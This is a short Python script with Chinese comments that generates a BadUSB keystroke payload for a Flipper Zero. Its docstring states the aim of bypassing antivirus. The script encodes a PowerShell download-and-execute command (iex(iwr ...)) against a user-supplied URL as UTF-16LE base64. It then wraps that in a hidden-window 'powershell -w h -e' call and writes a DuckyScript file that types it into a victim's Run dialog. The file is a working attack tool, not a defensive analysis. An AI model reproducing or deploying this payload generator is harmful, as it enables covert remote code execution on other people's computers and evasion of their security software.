import base64

"""
badusb载荷制作

想为flipper zero制作badusb在目标主机执行，但是直接写入powershell命令输入时间太长，vbs无窗口加载power在执行vbs以前就已经报毒了，偶然间刷到毛子的复制文字以通过人机验证的恶意攻击，现整理毛子攻击思路如下：
该脚本用于将明文转换为小头utf16编码以绕过杀软
有效的载荷是这样的：
将你的powershell代码上传到服务器如： https://localhost.com/a.html
将这段明文通过本脚本生成base64编码： iex(iwr -Uri 'https://localhost.com/a.html')
将生成的base64编码制作成如下badusb： cmd /c powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAuAGMAbwBtAC8AYQAuAGgAdABtAGwAJwApAA==
直接执行powershell也是可以的 powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAuAGMAbwBtAC8AYQAuAGgAdABtAGwAJwApAA==
"""

def encode_to_base64(text):
    utf16_byte = text.encode('utf-16le')
    base64_str = base64.b64encode(utf16_byte).decode('utf-8')
    return base64_str

def decode_from_base64(base64_str):
    utf16_byte = base64.b64decode(base64_str)
    text = utf16_byte.decode('utf-16le')
    return text

def encode_test():
    text = input("输入待编码的明文： ")
    base64_str = encode_to_base64(text)
    print(f'编码base64： {base64_str}')
    retext = decode_from_base64(base64_str)
    print(f'还原明文： {retext}')

if __name__ == '__main__':
    url = input('输入载荷网址: ')
    base64_str = encode_to_base64(f"iex(iwr -Uri '{url}')")
    print(f'编码base64: {base64_str}')
    payload = f'cmd /c powershell -w h -e {base64_str}'  # 不使用引号也能执行成功，使用引号可能因为全角符号失败，可通过alt+34输入双引号或者alt+39输入单引号
    print(f'badusb:  {payload}')
    with open("svh.txt", "w") as f:
        f.write(f'GUI r\nDELAY 1000\nSTRING {payload}\nDELAY 500\nENTER')
